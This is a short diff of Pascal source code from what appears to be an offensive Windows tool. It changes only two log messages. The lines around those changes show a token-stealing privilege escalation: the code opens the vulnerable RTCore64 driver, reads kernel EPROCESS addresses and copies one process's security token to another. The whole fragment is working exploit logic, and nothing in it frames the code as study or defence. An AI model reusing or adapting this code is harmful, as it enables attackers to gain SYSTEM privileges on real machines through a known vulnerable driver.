@@ -138,7 +138,7 @@ begin
 result:=false;
 src_EProcessAddr :=getEProcess (source);
 dst_EProcessAddr :=getEProcess (destination);
-writeln('Src. EProcessAddr:'+inttohex(src_EProcessAddr,8));
+writeln('Src.  EProcessAddr:'+inttohex(src_EProcessAddr,8));
 writeln('Dest. EProcessAddr:'+inttohex(dst_EProcessAddr,8));
 if dst_EProcessAddr>0 then
    begin
@@ -146,7 +146,7 @@ if dst_EProcessAddr>0 then
      begin
      device:=OpenHandle('\\.\RTCore64');
      if device=thandle(-1) then begin writeln('handle failed');exit;end;
-     writeln('make system');
+     writeln('stealtoken '+inttostr(source)+' '+inttostr(destination));
      //clear low 4 bits of _EX_FAST_REF structure
      //https://www.geeksforgeeks.org/bitwise-operators-in-c-cpp/
      SourceProcessToken := ReadMemoryDWORD64(Device, src_EProcessAddr + offsets.Token) and not 15;
